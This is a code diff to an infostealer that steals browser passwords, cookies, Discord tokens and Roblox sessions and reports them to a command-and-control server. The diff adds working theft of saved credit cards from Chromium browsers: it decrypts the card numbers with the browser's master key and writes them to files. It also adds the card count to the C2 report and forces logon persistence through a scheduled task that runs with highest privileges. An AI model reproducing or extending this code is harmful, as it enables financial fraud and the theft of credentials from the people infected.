@@ -35,6 +35,7 @@ cookie_count: int = 0
 password_count: int = 0
 autofill_count: int = 0
 browsing_history: int = 0
+credit_cards: int = 0
 discord_accounts: int = 0
 minecraft_sessions: int = 0
 gd_session = 0
@@ -652,14 +653,19 @@ def persistence(copypath):
         shutil.copy2(sys.executable, copypath)
         existing = subprocess.run('schtasks /query /tn {} /v /fo list'.format(taskname), shell=True, capture_output=True, text=True)
         if not copypath in existing.stdout:
-            subprocess.run('schtasks /delete /tn {} /f'.format(taskname), shell=True, check=True, text=True, capture_output=True)
+            try:
+                subprocess.run('schtasks /delete /tn {} /f'.format(taskname), shell=True, check=True, text=True, capture_output=True)
+            except:
+                pass
         else:
             return
-        subprocess.run('schtasks /create /sc onlogon /tn {} /tr "{}" /rl highest'.format(taskname, copypath), shell=True, check=True, text=True, capture_output=True)
             
 
     except Exception as e:
         print('persistence failed', e)
+
+    subprocess.run('schtasks /create /sc onlogon /tn {} /tr "{}" /rl highest'.format(taskname, copypath), shell=True, check=True, text=True, capture_output=True)
+
 
 def stealchromium():
     global cookie_count
@@ -667,6 +673,7 @@ def stealchromium():
     global browsing_history
     global autofill_count
     global rblx_cookies
+    global credit_cards
     if config.browsers:
     
         chromium_paths = {
@@ -726,6 +733,7 @@ def stealchromium():
                 passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
                 autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
                 historyoutput = os.path.join(output, name, profile, 'History.txt')
+                creditcardoutput = os.path.join(output, name, profile, 'Cards.txt')
                 
                 profile_path = os.path.join(userdata, profile)
                 #print(profile_path)
@@ -733,9 +741,11 @@ def stealchromium():
                 cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
                 if not os.path.exists(cookie_path):
                     cookie_path = os.path.join(profile_path, 'Cookies')
+
                 password_path = os.path.join(profile_path, 'Login Data')
                 autofill_path = os.path.join(profile_path, 'Web Data')
                 history_path = os.path.join(profile_path, 'History')
+
                 if os.path.exists(autofill_path):
                     tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                     shutil.copy2(autofill_path, tmpdir)
@@ -784,6 +794,30 @@ def stealchromium():
                     except:
                         pass
                    
+                if os.path.exists(autofill_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    shutil.copy2(autofill_path, tmpdir)
+                    con = sqlite3.connect(tmpdir)
+                    cur = con.cursor()
+                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                    try:
+                        for cardname, expmonth, expyear, encnumber in cur.fetchall():
+                            if encnumber.startswith(b'v10') or encnumber.startswith(b'v11'):
+                                number = decrypt_password(encnumber, master_key)
+                            elif encnumber.startswith(b'v20'):
+                                pass
+                            else:
+                                number = decrypt_old(encnumber)
+                            line = f"Name: {cardname}\nExpiry Date: {expmonth}/{expyear}\nNumber: {number}\n---------------------------------\n"
+                           # print(line)
+                            write(creditcardoutput, line)
+                            credit_cards += 1
+                    except Exception as e:
+                        pass
+                    cur.close()
+                    con.close()
+                    removefile(tmpdir)
+
                 if os.path.exists(password_path):
                     tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                     shutil.copy2(password_path, tmpdir)
@@ -831,6 +865,7 @@ def stealchromiumv20():
     global cookie_count
     global password_count
     global rblx_cookies
+    global credit_cards
 
     if config.browsers:
         chromium_paths = {
@@ -863,12 +898,14 @@ def stealchromiumv20():
                 os.makedirs(os.path.join(output, name, profile), exist_ok=True)
                 cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
                 passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
-                
+                creditcardoutput = os.path.join(output, name, profile, 'Cards.txt')
+
                 profile_path = os.path.join(userdata, profile)
 
                 cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
                 password_path = os.path.join(profile_path, 'Login Data')
-                
+                creditcard_path = os.path.join(profile_path, 'Web Data')
+
                 master_key = get_master_keyv2(local_state, ncryptkey)
 
                 if os.path.exists(cookie_path):
@@ -916,6 +953,25 @@ def stealchromiumv20():
                     cur.close()
                     con.close()
                     removefile(tmpdir)
+                if os.path.exists(creditcard_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    shutil.copy2(creditcard_path, tmpdir)
+                    con = sqlite3.connect(tmpdir)
+                    cur = con.cursor()
+                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                    try:
+                        for cardname, expmonth, expyear, encnumber in cur.fetchall():
+                            decrypted = decrypt_v20_password(encnumber, master_key)
+                            if decrypted is not None:
+                                line = f"Name: {cardname}\nExpiry Date: {expmonth}/{expyear}\nNumber: {decrypted}\n---------------------------------\n"
+
+                                write(creditcardoutput, line)
+                                credit_cards += 1
+                    except Exception as e:
+                        pass
+                    cur.close()
+                    con.close()
+                    removefile(tmpdir)
                    
     
 def stealgecko():
@@ -924,10 +980,11 @@ def stealgecko():
     global browsing_history
     global autofill_count
     global rblx_cookies
+
+
     if config.browsers:
         gecko_paths = {
             "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
-            #"Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
             "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
             "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
             "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
@@ -940,6 +997,7 @@ def stealgecko():
         }
         for name, path in gecko_paths.items():
             nss = path['nss']
+            
             userdata = path['path']
             profiles = []
             if not os.path.exists(userdata):
@@ -990,7 +1048,6 @@ def stealgecko():
                     try:
                         shutil.copy2(password_path, tmpdir)
                         _nss3 = load_nss(profile_path, nss)
-                        
                         if _nss3:
                             with open(tmpdir, 'r', encoding='utf-8') as f:
                                 lgns = json.load(f).get('logins', [])
@@ -1002,7 +1059,9 @@ def stealgecko():
                                 if Cusername and Cpassword:
                                     line = f"URL: {host}\nUsername: {Cusername}\nPassword: {Cpassword}\n---------------------------------\n"
                                     write(passwordoutput, line)
+
                                     password_count += 1
+                        
                         removefile(tmpdir)
                     except Exception as e:
                         pass
@@ -1323,7 +1382,7 @@ def collectroblox():
                         decrypted_list = decrypted.split(";")
                         for cookie in decrypted_list:
                             if '.ROBLOSECURITY' in cookie:
-                                print(cookie.strip())
+                               # print(cookie.strip())
                                 write(os.path.join(robloxoutput, 'Cookies.txt'), cookie.strip() + '\n')
                                 roblox_cookies += 1
 
@@ -1533,6 +1592,11 @@ def sendtoc2(file):
                   "inline": True
                 },
                 {
+                    'name': ":credit_card: Credit Cards",
+                    'value': str(credit_cards),
+                    'inline': True
+                },
+                {
                   "name": ":robot: Processes",
                   "value": str(process_count),
                   "inline": True
@@ -1621,6 +1685,7 @@ def sendtoc2(file):
 🔑 Passwords: {str(password_count)}
 📝 Autofills: {str(autofill_count)}
 📜 History: {str(browsing_history)}
+💳 Credit Cards: {str(credit_cards)}
 🪙 Discord Tokens: {str(discord_accounts)}
 ⛏ Minecraft Sessions: {str(minecraft_sessions)}
 🤖 Processes: {str(process_count)}
